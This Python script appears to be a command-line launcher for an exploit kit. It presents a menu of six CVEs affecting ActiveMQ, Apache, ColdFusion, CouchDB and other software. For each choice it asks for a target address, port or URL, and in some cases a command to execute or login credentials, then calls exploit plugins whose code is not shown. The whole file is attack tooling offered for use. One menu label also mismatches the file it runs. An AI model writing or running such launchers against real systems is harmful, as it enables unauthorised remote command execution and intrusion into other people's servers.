#author:九世
#time:2019/1/16

try:
    import readline
except:
    pass

import time
import platform
import os

class Main:
    def cve_2015_5254(self):
        obj=__import__('plugin.CVE-2015-5254',fromlist=True) #导入了plugin文件里的CVE-2015-2524
        daoru=getattr(obj,'jiancha') #调用了jiancha()函数,此时：daoru=jiancha()
        daoru()
        time.sleep(1)
        daoru2=getattr(obj,'run')
        ips=input('IP:')
        ports=input('port:')
        execs=input('exec:')
        daoru2(execs,ips,ports)

    def cve_2016_3088(self):
        oks=__import__('plugin.CVE-2016-3088',fromlist=True)
        daoru2=getattr(oks,'jiancha')
        userq=input('URL:')
        path=input('path:')
        daoru2(userq,path)

    def cve_2017_15715(self):
        ojn=__import__('plugin.CVE-2017-15715',fromlist=True)
        daoru3=getattr(ojn,'jianche')
        xwen=input('URL:')
        daoru3(xwen)

    def cve_2010_2861(self):
        bqc=__import__('plugin.CVE-2010-2861',fromlist=True)
        daoru4=getattr(bqc,'exploit')
        userq=input('URL:')
        daoru4(userq)

    def cve_2018_18852(self):
        systemqs=platform.system()
        if systemqs=='Windows':
            os.system('python plugin/CVE-2018-18854.py')
        elif systemqs=='Linux':
            os.system('python3 plugin/CVE-2018-18854.py')
    def cve_2017_12635(self):
        ojb=__import__('plugin.CVE-2017-12635',fromlist=True)
        dru=getattr(ojb,'cve_2017_12635')
        user=input('URL:')
        username=input('username:')
        password=input('password:')
        dru(user,username,password)
if __name__ == '__main__':
    obj=Main()
    exp_list=['[1] CVE-2015-5254','[2] CVE-2016-3088','[3] CVE-2017-15715','[4] CVE-2010-2861','[5] CVE-2018-18852','[6] CVE-2017-12635']
    exp_cat={'1':obj.cve_2015_5254,'2':obj.cve_2016_3088,'3':obj.cve_2017_15715,'4':obj.cve_2010_2861,'5':obj.cve_2018_18852,'6':obj.cve_2017_12635}
    while True:
        print('[h] exploit select:)')
        for e in exp_list:
            print(e)
    
        user=input('select:>')
        if user in exp_cat:
            exp_cat.get(user)()
            print('')
            print('')
        elif user=='exit':
            break
        else:
            print('[e] Not Found select')
            print('')
            print('')
            continue